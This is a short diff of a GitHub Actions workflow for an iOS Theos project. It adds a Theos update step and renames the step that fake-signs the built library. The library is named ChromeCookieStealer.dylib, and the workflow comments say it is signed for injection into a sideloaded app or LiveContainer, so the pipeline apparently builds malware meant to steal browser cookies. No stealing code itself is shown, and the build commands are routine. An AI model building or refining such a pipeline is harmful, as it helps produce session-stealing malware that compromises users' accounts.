@@ -34,6 +34,10 @@ jobs:
           echo "THEOS=$HOME/theos" >> $GITHUB_ENV
           echo "$HOME/theos/bin" >> $GITHUB_PATH
 
+      - name: Update Theos (fix vendor missing)
+        run: |
+          $THEOS/bin/update-theos
+
       - name: Download latest SDKs
         run: |
           curl -L https://github.com/theos/sdks/tarball/master | tar -xz -C $THEOS/sdks --strip-components=1
@@ -43,7 +47,7 @@ jobs:
           make clean
           make
 
-      - name: Fake-Sign dylib (für Injection in sideloaded IPA)
+      - name: Fake-Sign dylib (für LiveContainer Injection)
         run: |
           ldid -S obj/ChromeCookieStealer.dylib
 
